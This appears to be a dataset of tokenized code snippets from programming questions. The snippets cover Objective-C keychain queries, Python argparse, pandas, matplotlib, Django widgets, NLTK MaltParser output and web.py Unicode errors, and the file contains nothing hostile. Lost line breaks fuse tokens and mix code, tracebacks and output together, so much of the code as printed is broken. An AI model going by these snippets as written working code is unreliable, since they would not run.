"NSMutableDictionary * queryPublicKey = [ [ NSMutableDictionary alloc ] init ] ; // Set the public key query dictionary . [ queryPublicKey setObject : ( __bridge id ) kSecClassKey forKey : ( __bridge id ) kSecClass ] ; [ queryPublicKey setObject : publicTag forKey : ( __bridge id ) kSecAttrApplicationTag ] ; [ queryPublicKey setObject : ( __bridge id ) kSecAttrKeyTypeRSA forKey : ( __bridge id ) kSecAttrKeyType ] ; [ queryPublicKey setObject : [ NSNumber numberWithBool : YES ] forKey : ( __bridge id ) kSecReturnData ] ; // Get the key bits.sanityCheck = SecItemCopyMatching ( ( __bridge CFDictionaryRef ) queryPublicKey , ( CFTypeRef* ) & cfresult ) ; if ( sanityCheck ! = noErr ) { publicKeyBits = nil ; } else { publicKeyBits = ( __bridge_transfer NSData * ) cfresult ; } return publicKeyBits ; pubKey = request.form [ 'publickey ' ] uid = uuid4 ( ) .hexwhile not unique ( uid , User ) : uid = uuid.uuid4 ( ) .hexuser = User ( uid , email , secret , pubKey ) def validate ( sessionKey , sig , pem ) : bio = BIO.MemoryBuffer ( pem.encode ( 'ascii ' ) ) rsa = RSA.load_pub_key_bio ( bio ) pubkey = EVP.PKey ( ) pubkey.assign_rsa ( rsa ) pubkey.reset_context ( md='sha1 ' ) pubkey.verify_init ( ) pubkey.verify_update ( sessionKey ) return pubkey.verify_final ( sig )"
"// Represents a one-channel 8-bit imagetypedef struct simple_image_t { uint32 rows ; uint32 cols ; uint8 *imgdata ; } simple_image ; // Allows python to easily create and initialize this structuresimple_image* py_make_simple_image ( uint32 width , uint32 height ) { simple_image* img = new simple_image ( ) ; img- > rows = height ; img- > cols = width ; img- > imgdata = new uint8 [ height * width ] ; return img ; } // Allows python to set a particular pixel valuevoid py_set_simple_image ( simple_image* img , uint32 pos , uint8 val ) { img- > imgdata [ pos ] = val ; } # Make sure it 's an 8-bit imageif pil_image.mode ! = `` L '' : pil_image = pil_image.convert ( `` L '' ) # Create the simple image structure ( width , height ) = pil_image.sizeimg = swig_wrapper.py_make_simple_image ( width , height ) try : # Copy the image data into the simple image structure pos = 0 for pixel in pil_image.getdata ( ) : swig_wrapper.py_set_simple_image ( img , pos , pixel ) pos += 1 # Call some library method that accepts a simple_image* return swig_wrapper.some_image_method ( img ) finally : # Clean up the simple image structure swig_wrapper.py_destroy_simple_image ( img )"
"> > > a = [ 3 , 2 ] > > > a [ 0:1 ] [ 0 ] = 1 > > > a [ 3 , 2 ] > > > a [ 0:1 ] = [ 1 ] > > > a [ 1 , 2 ]"
.. automodule : : foo.bar : members : : exclude-members : longstuff .. py : data : : longstuff
"dict = { ' a ' : 100 , ' b ' : 5 , ' c ' : 150 , 'd ' : 60 } ; most_similar = max ( dic.iteritems ( ) , key=operator.itemgetter ( 1 ) ) [ 0 ] cad"
"# ! /usr/bin/pythonimport argparseparser = argparse.ArgumentParser ( description='Find matrices . ' ) parser.add_argument ( 'integers ' , metavar= ( ' n ' , ' h ' ) , type=int , nargs=2 , help='Dimensions of the matrix ' ) ( n , h ) = parser.parse_args ( ) .integers Traceback ( most recent call last ) : File `` argp.py '' , line 15 , in < module > ( n , h ) = parser.parse_args ( ) .integers File `` /usr/lib/python2.7/argparse.py '' , line 1688 , in parse_args args , argv = self.parse_known_args ( args , namespace ) File `` /usr/lib/python2.7/argparse.py '' , line 1720 , in parse_known_args namespace , args = self._parse_known_args ( args , namespace ) File `` /usr/lib/python2.7/argparse.py '' , line 1926 , in _parse_known_args start_index = consume_optional ( start_index ) File `` /usr/lib/python2.7/argparse.py '' , line 1866 , in consume_optional take_action ( action , args , option_string ) File `` /usr/lib/python2.7/argparse.py '' , line 1794 , in take_action action ( self , namespace , argument_values , option_string ) File `` /usr/lib/python2.7/argparse.py '' , line 994 , in __call__ parser.print_help ( ) File `` /usr/lib/python2.7/argparse.py '' , line 2313 , in print_help self._print_message ( self.format_help ( ) , file ) File `` /usr/lib/python2.7/argparse.py '' , line 2280 , in format_help formatter.add_arguments ( action_group._group_actions ) File `` /usr/lib/python2.7/argparse.py '' , line 273 , in add_arguments self.add_argument ( action ) File `` /usr/lib/python2.7/argparse.py '' , line 258 , in add_argument invocations = [ get_invocation ( action ) ] File `` /usr/lib/python2.7/argparse.py '' , line 534 , in _format_action_invocation metavar , = self._metavar_formatter ( action , action.dest ) ( 1 ) ValueError : too many values to unpack"
"from shapely.geometry import boxdata = [ box ( 1,2,3,4 ) , box ( 5,6,7,8 ) , box ( 1,2,3,4 ) ] codes = [ ' A ' , ' B ' , ' C ' ] A = box ( 1,2,3,4 ) B = box ( 5,6,7,8 ) C = box ( 1,2,3,4 ) result = [ ( A , C ) , ( B ) ] results = [ ] for p , c in zip ( data , codes ) : for x in data : if p.intersects ( x ) : # # .intersects return true if they overlap else false results.append ( c ) print results"
"from PyPDF2 import PdfFileReader , PdfFileMergerdef main ( ) : merger = PdfFileMerger ( ) pagenum = 0firstOne = Truefor file in [ `` a.pdf '' , '' b.pdf '' , '' c.pdf '' ] : print ( `` next row '' ) pdf = PdfFileReader ( open ( file , '' rb '' ) ) merger.append ( pdf ) if firstOne : child = merger.addBookmark ( title= '' blabla '' , pagenum=1 ) firstOne = False else : child = merger.addBookmark ( title= '' blabla '' , pagenum=1 , parent=child ) merger.write ( `` test.pdf '' ) if __name__ == `` __main__ '' : main ( ) blabla blabla blabla blabla blabla blabla"
"with plt.xkcd ( ) : plt.figure ( ) plt.plot ( np.sin ( np.linspace ( 0 , 10 ) ) ) plt.title ( 'Whoo Hoo ! ! ! ' )"
"[ { `` id '' : `` tools '' , `` children '' : [ { `` caption '' : `` SublimeREPL '' , `` mnemonic '' : `` R '' , `` id '' : `` SublimeREPL '' , `` children '' : [ { `` caption '' : `` Python '' , `` id '' : `` Python '' , `` children '' : [ { `` command '' : `` repl_open '' , `` caption '' : `` Python '' , `` id '' : `` repl_python '' , `` mnemonic '' : `` P '' , `` args '' : { `` type '' : `` subprocess '' , `` encoding '' : `` utf8 '' , `` cmd '' : [ `` python '' , `` -i '' , `` -u '' ] , `` cwd '' : `` $ file_path '' , `` syntax '' : `` Packages/Python/Python.tmLanguage '' , `` external_id '' : `` python '' , `` extend_env '' : { `` PYTHONIOENCODING '' : `` utf-8 '' } } } , { `` command '' : `` python_virtualenv_repl '' , `` id '' : `` python_virtualenv_repl '' , `` caption '' : `` Python - virtualenv '' } , { `` command '' : `` repl_open '' , `` caption '' : `` Python - PDB current file '' , `` id '' : `` repl_python_pdb '' , `` mnemonic '' : `` D '' , `` args '' : { `` type '' : `` subprocess '' , `` encoding '' : `` utf8 '' , `` cmd '' : [ `` python '' , `` -i '' , `` -u '' , `` -m '' , `` pdb '' , `` $ file_basename '' ] , `` cwd '' : `` $ file_path '' , `` syntax '' : `` Packages/Python/Python.tmLanguage '' , `` external_id '' : `` python '' , `` extend_env '' : { `` PYTHONIOENCODING '' : `` utf-8 '' } } } , { `` command '' : `` repl_open '' , `` caption '' : `` Python - RUN current file '' , `` id '' : `` repl_python_run '' , `` mnemonic '' : `` R '' , `` args '' : { `` type '' : `` subprocess '' , `` encoding '' : `` utf8 '' , `` cmd '' : [ `` python '' , `` -u '' , `` $ file_basename '' ] , `` cwd '' : `` $ file_path '' , `` syntax '' : `` Packages/Python/Python.tmLanguage '' , `` external_id '' : `` python '' , `` extend_env '' : { `` PYTHONIOENCODING '' : `` utf-8 '' } } } , { `` command '' : `` repl_open '' , `` caption '' : `` Python - IPython '' , `` id '' : `` repl_python_ipython '' , `` mnemonic '' : `` I '' , `` args '' : { `` type '' : `` subprocess '' , `` encoding '' : `` utf8 '' , `` autocomplete_server '' : true , `` cmd '' : { `` osx '' : [ `` python '' , `` -u '' , `` $ { packages } /SublimeREPL/config/Python/ipy_repl.py '' ] , `` linux '' : [ `` python '' , `` -u '' , `` $ { packages } /SublimeREPL/config/Python/ipy_repl.py '' ] , `` windows '' : [ `` python '' , `` -u '' , `` $ { packages } /SublimeREPL/config/Python/ipy_repl.py '' ] } , `` cwd '' : `` $ file_path '' , `` syntax '' : `` Packages/Python/Python.tmLanguage '' , `` external_id '' : `` python '' , `` extend_env '' : { `` PYTHONIOENCODING '' : `` utf-8 '' , `` SUBLIMEREPL_EDITOR '' : `` $ editor '' } } } ] } ] } ] } ] { `` command '' : `` repl_open '' , '' caption '' : `` Python - PDB current file '' , '' id '' : `` repl_python_pdb '' , '' mnemonic '' : `` D '' , '' args '' : { `` type '' : `` subprocess '' , `` encoding '' : `` utf8 '' , `` cmd '' : [ `` /usr/local/bin/python3 '' , `` -i '' , `` -u '' , `` -m '' , `` pdb '' , `` $ file_basename '' ] , `` cwd '' : `` $ file_path '' , `` syntax '' : `` Packages/Python/Python.tmLanguage '' , `` external_id '' : `` python '' , `` extend_env '' : { `` PYTHONIOENCODING '' : `` utf-8 '' } } }"
"class Person : num_of_people = 0 def __init__ ( self , name ) : self.name = name Person.num_of_people += 1 def __del__ ( self ) : Person.num_of_people -= 1 def __str__ ( self ) : return 'Hello , my name is ' + self.namecb = Person ( 'Corey ' ) kb = Person ( 'Katie ' ) v = Person ( 'Val ' ) Exception AttributeError : `` 'NoneType ' object has no attribute 'num_of_people ' '' in < bound method Person.__del__ of < __main__.Person object at 0x7f5593632590 > > ignored class Person : num_of_people = 0 def __init__ ( self , name ) : self.name = name Person.num_of_people += 1 def __del__ ( self ) : Person.num_of_people -= 1 def __str__ ( self ) : return 'Hello , my name is ' + self.namecb = Person ( 'Corey ' ) kb = Person ( 'Katie ' ) vb = Person ( 'Val ' )"
set -e # Run linters and testssource scripts/lint.sh set -eset -vwhich pythonflake8 ~project name~mypy ~project name~pytest -xblack -- check -- fast -- quiet ~project name~set +v
"The 'size ' property is a number and may be specified as : - An int or float in the interval [ 1 , inf ] - A tuple , list , or one-dimensional numpy array of the above import dashfrom dash.dependencies import Input , Outputimport dash_core_components as dccimport dash_html_components as htmlimport plotly.graph_objs as golabels = { 'Point 1 ' : ( 3.5,5 ) , 'Point 2 ' : ( 1.5,2 ) , 'Point 3 ' : ( 3.5,8 ) } app = dash.Dash ( __name__ ) app.layout = html.Div ( [ html.H1 ( 'Test ' , id='test ' , style= { 'margin ' : 50 } ) , dcc.Graph ( id='my-plot ' , style= { 'margin ' : 10 } ) , ] ) @ app.callback ( Output ( 'my-plot ' , 'figure ' ) , [ Input ( 'test ' , 'children ' ) ] ) def update_graph ( val ) : return { 'data ' : [ go.Scatter ( x= [ v [ 0 ] ] , y= [ v [ 1 ] ] , text=k , mode='text ' ) for k , v in labels.items ( ) ] , 'layout ' : go.Layout ( margin= { ' l ' : 40 , ' b ' : 40 , 't ' : 40 , ' r ' : 40 } , shapes= [ { 'type ' : 'path ' , 'path ' : ' M 1 1 L 1 3 L 4 1 Z ' , 'fillcolor ' : 'rgba ( 44 , 160 , 101 , 0.5 ) ' , 'line ' : { 'color ' : 'rgb ( 44 , 160 , 101 ) ' , } } , { 'type ' : 'path ' , 'path ' : ' M 3,7 L2,8 L2,9 L3,10 , L4,10 L5,9 L5,8 L4,7 Z ' , 'fillcolor ' : 'rgba ( 255 , 140 , 184 , 0.5 ) ' , 'line ' : { 'color ' : 'rgb ( 255 , 140 , 184 ) ' , } } , ] ) } if __name__ == '__main__ ' : app.run_server ( )"
"with gcp.lock ( lock_key ) as key : user.get ( user_id ) # read user.update ( amount ) # update user.set ( ) # save # Release the lock , so that other processes can now updated user ( identified by user_id ) object"
"import numpy as npimport matplotlib.pyplot as pltimport statsmodels.api as smdta = sm.datasets.sunspots.load_pandas ( ) .datadta.index = pandas.Index ( sm.tsa.datetools.dates_from_range ( '1700 ' , '2008 ' ) ) dta = dta.drop ( 'YEAR',1 ) arma_mod30 = sm.tsa.ARMA ( dta , ( 3 , 0 ) ) .fit ( disp=False ) predict_sunspots = arma_mod30.predict ( '1990 ' , '2012 ' , dynamic=True ) fig , ax = plt.subplots ( figsize= ( 12 , 8 ) ) ax = dta.ix [ '1950 ' : ] .plot ( ax=ax ) fig = arma_mod30.plot_predict ( '1990 ' , '2012 ' , dynamic=True , ax=ax , plot_insample=False ) plt.show ( )"
"from django.forms.widgets import ChoiceFieldRenderer , RadioChoiceInput , \ RendererMixin , Selectclass BootstrapRadioFieldRenderer ( ChoiceFieldRenderer ) : outer_html = ' < span { id_attr } > { content } < /span > ' inner_html = ' < div class= '' radio '' > { choice_value } { sub_widgets } < /div > ' choice_input_class = RadioChoiceInputclass BootstrapRadioSelect ( RendererMixin , Select ) : renderer = BootstrapRadioFieldRenderer _empty_value = `` Use a custom widget template instead ."
"class MCastIP ( sqlalchemy.types.TypeDecorator ) : impl = sqlalchemy.types.Integer def process_bind_param ( self , value , dialect ) : return int ( IPAddress ( value ) ) def process_result_value ( self , value , dialect ) : return IPAddress ( value ) def python_type ( self ) : return IPAddress"
"lists = [ [ ' a ' , ' b ' ] , [ 1 , 2 ] , [ ' i ' , 'ii ' ] , ] separator = '- ' result = [ ' a-1-i ' , ' a-1-ii ' , ' a-2-i ' , ' a-2-ii ' , ' b-1-i ' , ' b-1-ii ' , ' b-2-i ' , ' b-2-ii ' , ]"
"In [ 1 ] : import itertoolsIn [ 2 ] : gen = itertools.cycle ( ( 0,1,2 ) ) In [ 3 ] : zip ( gen , range ( 3 ) ) Out [ 3 ] : [ ( 0 , 0 ) , ( 1 , 1 ) , ( 2 , 2 ) ] In [ 4 ] : zip ( gen , range ( 3 ) ) Out [ 4 ] : [ ( 1 , 0 ) , ( 2 , 1 ) , ( 0 , 2 ) ] class loudCycle ( itertools.cycle ) : def next ( self ) : n = super ( loudCycle , self ) .next ( ) print n return nIn [ 6 ] : gen = loudCycle ( ( 0,1,2 ) ) In [ 7 ] : zip ( gen , range ( 3 ) ) 0120Out [ 7 ] : [ ( 0 , 0 ) , ( 1 , 1 ) , ( 2 , 2 ) ]"
"cdef void abc ( char [ : ] in_buffer ) : cdef char * element element = address ( in_buffer [ 1 ] ) ... def main ( ) : cdef Py_ssize_t i , n = 100 a = np.array ( [ 'ABC ' , 'D ' , 'EFGHI ' ] ) for i in range ( n ) : abc ( a ) cdef void abc ( char [ : , : :1 ] in_buffer ) nogil : cdef int max_elt_length = in_buffer.shape [ 1 ] +1 cdef char element [ max_elt_length+1 ] cdef int length for i in range ( in_buffer.shape [ 0 ] +1 ) : # is this equivalent to in_buffer.dtype.itemsize + 1 ? element [ max_elt_length ] = 0 # add null-terminator for full-size elements memcpy ( element , address ( buffer [ i , 0 ] ) , max_length ) length = strlen ( element ) ..."
"def foo ( a , b ) : return a + bd = { ' a':1 , ' b':2 , ' c':3 } foo ( **d ) -- > TypeError : foo ( ) got an unexpected keyword argument ' c ' import inspect # utilitiesdef get_input_names ( function ) : `` 'get arguments names from function '' ' return inspect.getargspec ( function ) [ 0 ] def filter_dict ( dict_ , keys ) : return { k : dict_ [ k ] for k in keys } def combine ( function , dict_ ) : `` 'combine a function with a dictionary that may contain more items than the function 's inputs `` ' filtered_dict = filter_dict ( dict_ , get_input_names ( function ) ) return function ( **filtered_dict ) # examplesdef foo ( a , b ) : return a + bd = { ' a':1 , ' b':2 , ' c':3 } print combine ( foo , d ) -- > 3"
Read line 1 - > Write line 1 - > Read line 2 - > Write line 2 ... Read line 1 - > Read line 2 - > Read line 3 ... Write line 1 - > Write line 2 ... .
"import pandas as pdtest = { `` index '' : range ( 10 ) , `` line '' : [ i**2 for i in range ( 10 ) ] , `` bar '' : [ i*10 for i in range ( 10 ) ] } test=pd.DataFrame ( test ) ax=test.plot ( x= '' index '' , y= '' line '' ) test.plot ( x= '' index '' , y= '' bar '' , color= '' r '' , kind= '' bar '' , ax=ax ) test.plot ( x= '' index '' , y= '' bar '' , color= '' r '' , kind= '' bar '' , ax=ax , secondary_y=True )"
"f [ list_ ] : = Map [ Prime [ Sow [ # ] ] & , list ] ; In [ 2 ] : = f [ { 1 , 3 , 4 } ] Out [ 2 ] = { 2 , 5 , 7 } In [ 3 ] : = Reap [ f [ { 1 , 3 , 4 } ] ] Out [ 3 ] : = { { 2 , 5 , 7 } , { { 1 , 3 , 4 } } }"
"_path_to_maltparser = '/home/alvas/maltparser-1.8/dist/maltparser-1.8/'_path_to_model= '/home/alvas/engmalt.linear-1.7.mco ' > > > mp = MaltParser ( path_to_maltparser=_path_to_maltparser , model=_path_to_model ) > > > sent = ' I shot an elephant in my pajamas'.split ( ) > > > sent2 = 'Time flies like banana'.split ( ) > > > print ( mp.parse_one ( sent ) .tree ( ) ) ( pajamas ( shot I ) an elephant in my ) _path_to_maltparser = '/home/alvas/maltparser-1.8/dist/maltparser-1.8/'_path_to_model= '/home/alvas/engmalt.linear-1.7.mco ' > > > mp = MaltParser ( path_to_maltparser=_path_to_maltparser , model=_path_to_model ) > > > sent = ' I shot an elephant in my pajamas'.split ( ) > > > sent2 = 'Time flies like banana'.split ( ) > > > print ( mp.parse_one ( sent ) .tree ( ) ) ( pajamas ( shot I ) an elephant in my ) > > > print ( next ( mp.parse_sents ( [ sent , sent2 ] ) ) ) < listiterator object at 0x7f0a2e4d3d90 > > > > print ( next ( next ( mp.parse_sents ( [ sent , sent2 ] ) ) ) ) [ { u'address ' : 0 , u'ctag ' : u'TOP ' , u'deps ' : [ 2 ] , u'feats ' : None , u'lemma ' : None , u'rel ' : u'TOP ' , u'tag ' : u'TOP ' , u'word ' : None } , { u'address ' : 1 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 2 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u ' I ' } , { u'address ' : 2 , u'ctag ' : u'NN ' , u'deps ' : [ 1 , 11 ] , u'feats ' : u ' _ ' , u'head ' : 0 , u'lemma ' : u ' _ ' , u'rel ' : u'null ' , u'tag ' : u'NN ' , u'word ' : u'shot ' } , { u'address ' : 3 , u'ctag ' : u'AT ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'AT ' , u'word ' : u'an ' } , { u'address ' : 4 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u'elephant ' } , { u'address ' : 5 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u'in ' } , { u'address ' : 6 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u'my ' } , { u'address ' : 7 , u'ctag ' : u'NNS ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NNS ' , u'word ' : u'pajamas ' } , { u'address ' : 8 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u'Time ' } , { u'address ' : 9 , u'ctag ' : u'NNS ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NNS ' , u'word ' : u'flies ' } , { u'address ' : 10 , u'ctag ' : u'NN ' , u'deps ' : [ ] , u'feats ' : u ' _ ' , u'head ' : 11 , u'lemma ' : u ' _ ' , u'rel ' : u'nn ' , u'tag ' : u'NN ' , u'word ' : u'like ' } , { u'address ' : 11 , u'ctag ' : u'NN ' , u'deps ' : [ 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] , u'feats ' : u ' _ ' , u'head ' : 2 , u'lemma ' : u ' _ ' , u'rel ' : u'dep ' , u'tag ' : u'NN ' , u'word ' : u'banana ' } ] _path_to_maltparser = '/home/alvas/maltparser-1.8/dist/maltparser-1.8/'_path_to_model= '/home/alvas/engmalt.linear-1.7.mco ' > > > mp = MaltParser ( path_to_maltparser=_path_to_maltparser , model=_path_to_model ) > > > sent1 = ' I shot an elephant in my pajamas'.split ( ) > > > sent2 = 'Time flies like banana'.split ( ) > > > sentences = [ sent1 , sent2 ] > > > for sent in sentences : > > > ... print ( mp.parse_one ( sent ) .tree ( ) ) # Initialize a MaltParser object with a pre-trained model.mp = MaltParser ( path_to_maltparser=path_to_maltparser , model=path_to_model ) sent = ' I shot an elephant in my pajamas'.split ( ) sent2 = 'Time flies like banana'.split ( ) # Parse a single sentence.print ( mp.parse_one ( sent ) .tree ( ) ) print ( next ( next ( mp.parse_sents ( [ sent , sent2 ] ) ) ) .tree ( ) ) ( pajamas ( shot I ) an elephant in my ) ( shot I ( banana an elephant in my pajamas Time flies like ) )"
"def _differ_square_sum ( self , blobs ) : import numpy as np gradients = np.sum ( np.multiply ( blobs [ 0 ] .diff , blobs [ 0 ] .diff ) ) + np.sum ( np.multiply ( blobs [ 1 ] .diff , blobs [ 1 ] .diff ) ) return gradientsdef _calculate_objective ( self , iteration , solver ) : net = solver.net params = net.params params_value_list = list ( params.keys ( ) ) [ print ( k , v.data.shape ) for k , v in net.blobs.items ( ) ] layer_num = len ( net.layers ) j = 0 for layer_index in range ( layer_num ) : if ( len ( net.layers [ layer_index ] .blobs ) > 0 ) : cur_gradient = self._differ_square_sum ( net.layers [ layer_index ] .blobs ) key = params_value_list [ j ] cur_gradient2 = self._differ_square_sum ( params [ key ] ) print ( [ cur_gradient , cur_gradient2 ] ) assert ( cur_gradient == cur_gradient2 )"
"from flask import Flask , jsonify , requestapp = Flask ( __name__ ) @ app.route ( '/cookie_echo ' ) def cookie_echo ( ) : return jsonify ( request.cookies ) with app.test_client ( ) as client : response = client.get ( `` /cookie_echo '' , headers= { `` Cookie '' : `` abc=123 ; def=456 '' } ) print ( response.get_data ( as_text=True ) ) $ curl -H `` Cookie : abc=123 ; def=456 '' http : //localhost:5000/cookie_echo { `` abc '' : '' 123 '' , '' def '' : '' 456 '' }"
"import pandas as pdimport numpy as npd = { 'col ' : [ `` baked '' , '' beans '' , '' baked '' , '' baked '' , '' beans '' ] } df = pd.DataFrame ( data=d ) uniq_lab = np.unique ( df [ 'col ' ] ) for lab in uniq_lab : df [ 'col ' ] .replace ( lab , np.where ( uniq_lab == lab ) [ 0 ] [ 0 ] .astype ( float ) , inplace=True ) col 0 baked 1 beans 2 baked 3 baked 4 beans col 0 0.0 1 1.0 2 0.0 3 0.0 4 1.0"
"import localeprefered_encoding = locale.getpreferredencoding ( ) prefered_encoding 'ANSI_X3.4-1968 ' web.template.render ( os.path.join ( root_path , dir_path ) , globals=self._template_globals , base=layout_path ) def __str__ ( self ) : self._prepare_body ( ) if PY2 : return self [ `` __body__ '' ] .encode ( 'utf-8 ' ) else : return self [ `` __body__ '' ] t = self._template ( name ) , File `` /lib/python3.5/site-packages/web/template.py '' , line 1028 , in _template , self._cache [ name ] = self._load_template ( name ) , File `` /lib/python3.5/site-packages/web/template.py '' , line 1016 , in _load_templatereturn Template ( open ( path ) .read ( ) , filename=path , **self._keywords ) File `` /lib64/python3.5/encodings/ascii.py '' , line 26 , in decodereturn codecs.ascii_decode ( input , self.errors ) [ 0 ] UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xe2 in position 83 : ordinal not in range ( 128 ) , < div class= '' modal-content '' > < div class= '' modal-header '' > < button type= '' button '' class= '' close '' data-dismiss= '' modal '' > & times ; < /button > < h4 class= '' modal-title feedback-modal-title '' > חישוב האיברים הראשונים בסדרה של איבר ראשון חיובי ויחס שלילי : < span class= '' red-text '' > אי הצלחה < /span > open ( '/path/to/feedback.html ' ) .read ( ) export PYTHONIOENCODING=utf8export LC_ALL=en_US.UTF-8export LANG=en_US.UTF-8export LANGUAGE=en_US.UTF-8 import os os.environ [ 'LC_ALL ' ] = 'en_US.UTF-8'os.environ [ 'LANG ' ] = 'en_US.UTF-8'os.environ [ 'LANGUAGE ' ] = 'en_US.UTF-8 ' SetEnv LC_ALL en_US.UTF-8SetEnv LANG en_US.UTF-8SetEnv LANGUAGE en_US.UTF-8SetEnv PYTHONIOENCODING utf8"
"> > > df ix val1 val2 val3 val4 1.31 2 3 4 5 8.22 2 3 4 5 5.39 2 3 4 5 7.34 2 3 4 5 df.index=df.index.str.replace ( `` \\ . [ 0-9 ] * '' , '' '' ) > > > df ix val1 val2 val3 val4 1 2 3 4 5 8 2 3 4 5 5 2 3 4 5 7 2 3 4 5"
"class Foo : @ classmethod def load ( cls , bar ) - > Foo : pass"
"data=ones ( ( 5,5 ) ) m=zeros ( ( 5,5 ) , dtype=bool ) '' '' '' Mask out row 3 '' '' '' m [ 3 , : ] =Truearr=ma.masked_array ( data , mask=m , fill_value=nan ) print arrprint 'Fill value : ' , arr.fill_valueprint arr.filled ( ) farr=arr.sum ( axis=1 ) print farrprint 'Fill value : ' , farr.fill_valueprint farr.filled ( ) '' '' '' I was expecting this '' '' '' print nansum ( arr.filled ( ) , axis=1 ) [ [ 1.0 1.0 1.0 1.0 1.0 ] [ 1.0 1.0 1.0 1.0 1.0 ] [ 1.0 1.0 1.0 1.0 1.0 ] [ -- -- -- -- -- ] [ 1.0 1.0 1.0 1.0 1.0 ] ] Fill value : nan [ [ 1 . 1 . 1 . 1 . 1 . ] [ 1 . 1 . 1 . 1 . 1 . ] [ 1 . 1 . 1 . 1 . 1 . ] [ nan nan nan nan nan ] [ 1 . 1 . 1 . 1 . 1 . ] ] [ 5.0 5.0 5.0 -- 5.0 ] Fill value : 1e+20 [ 5.00000000e+00 5.00000000e+00 5.00000000e+00 1.00000000e+20 5.00000000e+00 ] [ 5 . 5 . 5. nan 5 . ]"
"import logging , tempfile , os , sysdef getlog ( logname , filename = 'python.log ' , directory = None ) : `` 'returns a logger with logname that will print to filename and directoryname . ' '' if directory == None : fd , fname = tempfile.mkstemp ( ) directory = os.path.dirname ( fname ) fullpath = directory + '/ ' + filename mylog = logging.getLogger ( logname ) hdlr = logging.FileHandler ( fullpath ) formatter = logging.Formatter ( ' L : % ( name ) s M : % ( module ) s T : % ( asctime ) s > % ( levelname ) s : % ( message ) s ' ) hdlr.setFormatter ( formatter ) mylog.addHandler ( hdlr ) mylog.setLevel ( logging.INFO ) mylog.info ( 'NEW LOGGER STARTED ' ) return mylogif __name__ == '__main__ ' : log = getlog ( 'testing ' ) log.info ( 'working ? ' ) log.info ( 'yes , seems to be working ' ) log2 = getlog ( 'testing ' ) log2.info ( 'still working ? ' ) L : testing M : easy_log T:2011-04-11 15:30:14,315 > INFO : NEW LOGGER STARTEDL : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : working ? L : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : yes , seems to be workingL : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : NEW LOGGER STARTEDL : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : NEW LOGGER STARTEDL : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : still working ? L : testing M : easy_log T:2011-04-11 15:30:14,316 > INFO : still working ?"
"./manage.py shellPython 2.7.6 ( default , Jun 22 2015 , 17:58:13 ) [ GCC 4.8.2 ] on linux2Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information . ( InteractiveConsole ) > > > from haystack.query import SearchQuerySet > > > sqs = SearchQuerySet ( ) .all ( ) > > > sqs [ 0 ] .pku ' 1 ' > > > sqs [ 0 ] .textu'\u06a9\u0627\u0645\u0631\u0627\u0646 \u0647\u0645\u062a\u200c\u067e\u0648\u0631 \u0648 \u0641\u0631\u0647\u0627\u062f \u0628\u0627\u062f\u067e\u0627\nKamran Hematpour & amp ; Farhad Badpa ' > > > sqs [ 0 ] .model_nameu'artist ' > > > sqs [ 0 ] .idu'mediainfo.artist.1 ' > > > sqs [ 0 ] .objectModel could not be found for SearchResult ' < SearchResult : mediainfo.artist ( pk=u ' 1 ' ) > ' . HAYSTACK_CONNECTIONS = { 'default ' : { 'ENGINE ' : 'haystack.backends.solr_backend.SolrEngine ' , 'URL ' : 'http : //ahangsolr:8983/solr ' , } , } import datetimefrom haystack import indexesfrom mediainfo.models import Albumfrom mediainfo.models import Artistfrom mediainfo.models import PlayListfrom mediainfo.models import Trackfrom mediainfo.models import Lyricclass AlbumIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) artist = indexes.CharField ( model_attr='artist ' , indexed=True ) publish_date = indexes.DateTimeField ( model_attr='publish_date ' ) def get_model ( self ) : return Album def index_queryset ( self , using=None ) : `` '' '' Used when the entire index for model is updated . '' '' '' return self.get_model ( ) .objects.filter ( publish_date__lte=datetime.datetime.now ( ) ) class ArtistIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) def get_model ( self ) : return Artistclass PlaylistIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) def get_model ( self ) : return PlayListclass TrackIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) def get_model ( self ) : return Trackclass LyricIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) def get_model ( self ) : return Lyric"
